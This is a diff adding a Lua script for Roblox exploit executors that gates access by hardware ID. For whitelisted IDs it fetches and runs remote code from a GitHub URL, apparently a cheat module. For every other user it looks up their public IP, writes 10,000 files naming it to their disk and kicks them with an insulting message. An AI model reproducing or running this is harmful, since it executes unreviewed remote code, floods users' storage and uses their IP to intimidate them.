@@ -1,0 +1,27 @@
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+
+-- setclipboard(game:GetService("RbxAnalyticsService"):GetClientId()) -- Gets HWID
+
+local HwidWhitelist = {
+    "8C403AE6-9477-4CA1-832C-B5975D0F0C49", -- Add The , if its NOT the last one
+    "End"
+}
+
+if table.find(HwidWhitelist, HWID) then
+    print("Whitelisted")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EliyoqOffical/CustomModule/main/VapeV4", true))()
+else
+    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+    if isfolder(ip) == false then
+        makefolder(ip)
+    end
+    iea = 0
+    repeat
+        task.wait()
+        iea = iea + 1
+        writefile(ip.."/"..iea..".txt", "Your Ip is : "..ip)
+    until (iea >= 10000)
+    game:GetService("Players").LocalPlayer:Kick("You Are Not Whitelisted Mf. Also This : "..ip)
+end
+
